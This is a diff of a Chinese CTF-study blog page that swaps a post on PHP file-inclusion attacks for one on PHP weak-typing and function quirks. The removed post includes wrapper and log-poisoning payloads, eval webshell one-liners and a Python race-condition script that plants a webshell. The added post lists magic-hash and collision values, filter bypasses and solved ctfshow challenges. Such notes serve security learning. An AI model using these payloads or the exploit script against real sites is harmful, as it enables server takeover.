@@ -4,9 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件包含, Robin">
-    <meta name="description" content="概念文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 
-这种漏洞通常出现在应用程序中动态引用文件的代码中或是出现在用户可以控制文件名、文件路径或文件内容的输入参">
+    <meta name="keywords" content="PHP特性, Robin">
+    <meta name="description" content="思路积累各种函数，PHP语法特性，从中发现漏洞要求深入了解PHP语言并熟练使用其函数。
+漏洞利用【preg_match() 函数】
+preg_match()返回 pattern的匹配次数。 
+因为preg_match()在第一次匹配后将会停">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件包含 | Robin</title>
+    <title>PHP特性 | Robin</title>
     <link rel="icon" type="image/png" href="../../../../favicon.png">
     
     <style>
@@ -344,12 +346,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件包含</h1>
+                    <h1 class="description center-align post-title">PHP特性</h1>
                 </div>
             </div>
         </div>
@@ -396,7 +398,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-11
+                    2023-04-12
                 </div>
                 
 
@@ -410,14 +412,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    8 分
                 </div>
                 
 
@@ -437,107 +439,246 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p>
-<p>这种漏洞通常出现在应用程序中动态引用文件的代码中<br>或是出现在用户可以控制文件名、文件路径或文件内容的输入参数上。<br>攻击者可以在这些参数中注入特定的字符，从而构造一个恶意文件路径并被应用程序读取<br>应用程序没有对这个路径进行验证，最终导致攻击者可以获取系统权限或读取任意文件。 </p>
-<p>在开发应用程序时，需要对文件路径进行验证<br>并遵循最小权限原则，确保应用程序具有最小的访问权限。<br>此外，使用白名单或安全沙箱技术也可以帮助防止文件包含漏洞的发生</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【使用伪协议读取文件】
-参数=php://filter/convert.base64-encode/resource=目标文件
-file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==    
-file=data://text/plain,&lt;?=`tac f*`;?&gt;
+                <h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>积累各种函数，PHP语法特性，从中发现漏洞<br>要求深入了解PHP语言并熟练使用其函数。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【preg_match() 函数】
+preg_match()返回 pattern的匹配次数。 
+因为preg_match()在第一次匹配后将会停止搜索，所以它的值将是0次（不匹配）或1次
+因为preg_match函数无法处理数组，所以可以通过数组的方式绕过
+^表示匹配行头，$表示匹配行尾，i表示大小写都匹配，m表示多行匹配
+当^$一起的时候表示精准匹配，需要行首行尾都要有
 
 
-【UA注入后日志包含】
-user-ugent:
-&lt;?=eval($_POST[cmd]);?&gt;
-访问日志文件:
-?file=/var/log/nginx/access.log
-使用POST执行命令:
-cmd=system(“ls”);
-在UA中注入编码过的代码不会被浏览器解码
-GET请求的参数在存入PHP之前也不会被解码，但是日志在转发到PHO的端口之前就已经写入日志了。
+
+【intval() 函数】
+通过使用指定的进制 base 转换（默认是十进制），返回变量的整数数值
+base是0时检测变量格式，有0x前缀使用十六进制，0开头使用八进制，否则使用十进制且只看字母之前的部分
+intval()不能用于object否则会产生E_NOTICE错误并返回1（也就是True）
+由于数组为一个对象，所以对这时它会返回1
+此外，如果字符串以空格开头，intval函数会将其删除，然后再进行转换
 
 
-【session临时文件条件竞争】
-在.被过滤后php中唯一能无后缀控制的，只有session文件
-当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在下面的的某一个目录下:
-     /var/lib/php/
-     /var/lib/php/sessions/
-     /tmp/
-     /tmp/sessions/
-web服务会使用多线程接收用户的请求，以确保能够处理并发进程或线程不同的程序段
-在多个并发请求时多个进程可能会同时创建同一个session文件
-那么攻击者就有可能在服务器创建session文件之前，先创建一个同名的session文件
-并利用PHP_SESSION_UPLOAD_PROGRESS设置文件内容，写入攻击者的命令
-如果成功存入了恶意文件，就能访问该文件并POST执行RCE
-EXP放在了文末
+【弱类型绕过】
+===是先比较他们的类型然后在比较，==是先把他们转化成相同类型然后在进行比较
+例如，将一个字符串转换为整数时，PHP会尝试将字符串中的数字部分转换为整数
+如果字符串中不包含数字，则转换结果为0
 
 
-【绕过die函数】
-思路:
-将die函数的代码语句编码成不能正常执行的命令，然后再将文件内的恶意代码编码成可执行命令。
-首先，base64加秘后会忽略掉一些符号以及中文字体
-(只有+, / , 0-9,a-z,A~Z,其余字符都会被跳过)
-又因为base64加密是4个一组，所以当你随意加上字符补齐die函数的编码时就能绕过die函数
-例如
-&quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;解码的内容其实只有phpdie，所以需要再填充两位
-另外，因为php://filter伪协议支持使用多个过滤器
-所以可使用strip_tags与base64解码的形式来实现绕过死亡代码
-例如
-?file=php://filter/string.strip_tags|convert.base64-decode/resource=4.php
-除此之外，可以通过使用rot13加密让php引擎把该代码识别成乱码
-例如
-&lt;?=system(&#39;tac f*.php&#39;);?&gt;  ————&gt;  &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;
-&lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;  ————&gt;  &lt;?=system(&#39;tac f*.php&#39;);?&gt;
+【strpos() 函数】
+strpos($num, &quot;0&quot;)
+返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE
+
+
+【md5】
+对象的md5值是由对象的属性和方法组成的字符串的md5散列值。
+如果两个对象的属性和方法完全相同，则它们的md5值也会相同。
+因此a[]=1&amp;b[]=2的md5值就是相同的
+还有0e开头的字符串，会被PHP解释为0
+弱比较时常用的有
+QNKCDZO   s878926199a
+240610708  aabg7XSs  aabC9RqS  s878926199a
+强比较的需要使用数组绕过
+当使用string强行转换成字符串时限制了数组绕过这方法
+强碰撞使用
+M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+和
+M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+
+
+【in_array 函数】
+在大海（文件）中捞针（$allow）
+$allow = array(1,&#39;2&#39;,&#39;3&#39;);
+var_dump(in_array(&#39;文件&#39;,$allow));
+返回的为true
+$allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);
+var_dump(in_array(&#39;文件&#39;,$allow));
+返回false
+其实还有第三个参数type，用于判断数据类型是否相同
+php字符串和int比较时字符串会被转换成int
+因为是弱类型转换，所以数字后面的字符串会被忽略
+
+
+【file_put_contents 函数】
+file_put_contents(file,data,mode,context)
+file：规定写入的文件
+data：写入文件的数据
+mode：如何打开/写入文件(FILE_USE_INCLUDE_PATH,FILE_APPEND,LOCK_EX)
+context:文件句柄的环境
+
+
+【array_push 函数】
+给数组的结尾添加其他数值
+
+
+【PHP反射类】
+PHP反射类ReflectionClass()是PHP5及以上的一个内置类，它允许开发者在运行时获取一个类的信息:
+1.获取类的名称、父类、接口和命名空间
+2.获取类的属性，并获取或修改属性的访问权限、默认值和注释
+3.获取类的方法，并获取或修改方法的访问权限、参数、返回值和注释
+4.判断类是否为抽象类、接口或终极类
+5.获取类的文档注释和注解信息
+6.动态创建类的实例，并调用类的方法和属性
+使用echo new ReflectionClass命令即可输出
+因为ReflectionClass变量已经定义了，所以PHP解释器不会输出警告信息，而是将该变量的值设置为null。
+最终的效果是输出ReflectionClass类的定义信息，而没有输出警告信息。
+
+
+【call_user_func 函数】
+call_user_func($func, 1, 2);
+使用1,2的参数调用func的方法并返回结果
+
+
+【0x识别】
+7.1以下版本，0x的字符串也是可以识别为十六进制的
+在高版本下进制转换可以使用hex2bin函数将十六进制转换为ASCII字符
+例如:
+&lt;?=`cat *`;
+经过base64编码变成PD89YGNhdCAqYDs=
+使用bin2hex函数转换成5044383959474e6864434171594473
+带e的话会被认为是科学计数法，可以绕过is_numeric检测
+写入时使用伪协议php://filter/write=convert.base64-decode/resource=1.php
+注意:
+等号在base64中只是起到填充的作用，有没有等号解码出来的内容是相同的。
+
+
+【SHA1】
+sha1弱等于的，找加密后0e开头的即可
+aaK1STfY ==&gt;0e76658526655756207688271159624026011393
+aaO8zKZF ==&gt;0e89257456677279068558073954252716165668
+甚至可以使用数组绕过！
+
+
+【$$覆盖赋值】
+$var = &#39;hello&#39;;
+$$var = &#39;world&#39;;
+echo $hello;      // 输出 world
+可以看成这样子
+$var = &#39;hello&#39;;
+$($var) = &#39;world&#39;;
+echo $hello;      // 输出 world
+
+
+【ereg】
+只存在与PHP 5.3.4及之前的版本中
+一个比较古老的正则表达式匹配函数，一大把的漏洞
+用指定的模式搜索一个字符串中指定的字符串,成功为true,否则为false（大小写敏感）
+ereg函数存在NULL（%00）截断漏洞，可以绕过正则过滤，使用%00截断。
+函数匹配的字符串中包含NULL字符时会在NULL处停止匹配
+
+
+【strrev() 函数】
+翻转字符串，没啥好讲的。
+
+
+【PHP异常处理类】
+Exception处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类
+关于内置类的应用前面已经讲过了
+echo new ReflectionClass(system(&#39;ls&#39;));
+这种题看似很难，其实只需要在PHP手册里找到合适的类即可
+
+
+【GLOBALS】
+$GLOBALS — 引用全局作用域中可用的全部变量
+一个包含了全部变量的全局组合数组，变量的名字就是数组的键。
+
+
+【is_file 函数】
+检查指定的文件名是否是正常的文件
+?file=php://filter/resource=1.php
+php://filter/resource=1.php
+php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
+php://filter/read=convert.quoted-printable-encode/resource=1.php
+compress.zlib://1.php
+使用伪协议就能绕过检测
+原因是，伪协议实际上是一种特殊的URI（统一资源标识符），可以用来访问本地或远程的资源。
+当使用伪协议访问文件时，PHP会将其视为一个URI而不是一个文件路径，因此is_file函数无法判断其是否是一个文件。
+
+
+【filter 函数】
+对来自非安全来源的数据（比如用户输入）进行验证和过滤
+
 </code></pre>
-<p>session文件条件竞争EXP</p>
-<pre><code>import requests
-import io
-import threading
+<p>各种payload</p>
+<pre><code>小数点(含有0)      ?num=4476.0
+科学计数           ?num=4476e0
+十六进制           ?num=0x117c
+八进制             ?num=010574
+八进制+空格        ?num= 010574
+正负号             ?num=+4476.0
+</code></pre>
+<p>下面记一道$$覆盖赋值的题:</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
-url = &#39;&#39;    # 改成自己的url
-sessionid = &#39;truthahn&#39;      # 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn
-cookies = &#123;
-            &#39;PHPSESSID&#39;:sessionid
-        &#125;
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-def write(session):        # write()函数用于写入session临时文件
-    fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)    # 设置上传文件的大小为50k
-    data2 = &#123;
-        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?=eval($_POST[1])?&gt;&#39;    # 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话
-    &#125;
-    files = &#123;
-        &#39;file&#39;:(&#39;truthahn.jpg&#39;,fileBytes)
-    &#125;
-    while True:    
-        res = session.post(url,data=data2,cookies=cookies,files=files)
-        # print(res.text)
-        #print(&#39;======= write done! ======&#39;)
+<span class="token variable">$error</span><span class="token operator">=</span><span class="token string">'你还想要flag嘛？'</span><span class="token punctuation">;</span>
+<span class="token variable">$suces</span><span class="token operator">=</span><span class="token string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span>
 
-def read(session):         # read()函数利用session临时文件生成一句话木马，实现rce
-    data1 = &#123;
-        &quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/3.php&#39;,&#39;&lt;?=eval($_POST[2]);?&gt;&#39;);&quot;     # 使用file_put_contents()php内置函数生成名为3.php的shell文件
-    &#125;
-    while True:
-        res = session.post(url+&#39;?file=/tmp/sess_&#39;+sessionid,data=data1,cookies=cookies)
-        # print(res.text)
-        res2 = session.get(url+&#39;3.php&#39;)
-        # print(res2.text)
-        if res2.status_code == 200:     #若3.php成功生成，则返回Done!，否则返回失败的状态码
-            print(&#39;++++++++ Done! +++++++++&#39;)
-        else:
-            print(res2.status_code)
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        </span><span class="token comment" spellcheck="true">//自己传入的x是key,flag是value</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//$(x)=$(flag)，现在相当于x变量就是flag</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 
-if __name__ == &#39;__main__&#39;:
-    event = threading.Event()       
-    with requests.session() as session:     # 为每个函数设置5个线程并发执行，可以适当增加以应对系统执行的系统时间
-        for i in range(5):
-            #print(&#39;*&#39;*50)
-            threading.Thread(target=write,args=(session,)).start()
-        for i in range(5):
-            #print(&#39;=&#39;*50)
-            threading.Thread(target=read,args=(session,)).start()
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span><span class="token comment" spellcheck="true">//自己传入的error是key,x是value</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//$(error)=$(x)=$(flag)，相当于把error变量重构</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 
-    event.set()
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//error输出时其实已经是flag了</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token keyword">echo</span> <span class="token string">"your are good"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span>
+解法<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token constant">GET</span><span class="token punctuation">)</span><span class="token operator">?</span>x<span class="token operator">=</span><span class="token function">flag</span>   <span class="token punctuation">(</span><span class="token constant">POST</span><span class="token punctuation">)</span>error<span class="token operator">=</span>x
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>再来一题</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$$v1 = &amp;$$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span>$<span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+<span class="token delimiter">?></span>
+解法<span class="token punctuation">:</span><span class="token operator">?</span>v1<span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token constant">GLOBALS</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>各种可用的PHP类</p>
+<pre><code>FilesystemIterator
+遍历文件
+ 
+getcwd()函数
+返回当前路径
+
+directoryIterator
+遍历目录
 </code></pre>
 
                 
@@ -633,11 +774,12 @@ if __name__ == &#39;__main__&#39;:
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="../../12/PHP%E7%89%B9%E6%80%A7/">
+                <a href="">
                     <div class="card-image">
                         
                         
@@ -653,9 +795,9 @@ if __name__ == &#39;__main__&#39;:
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -668,6 +810,7 @@ if __name__ == &#39;__main__&#39;:
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -686,13 +829,13 @@ if __name__ == &#39;__main__&#39;:
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="../../08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                <a href="../../11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/4.jpg" class="responsive-img" alt="命令执行">
+                        <img src="../../../../medias/featureimages/13.jpg" class="responsive-img" alt="文件包含">
                         
-                        <span class="card-title">命令执行</span>
+                        <span class="card-title">文件包含</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -703,7 +846,7 @@ if __name__ == &#39;__main__&#39;:
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-11
                             </span>
                         <span class="publish-author">
                             
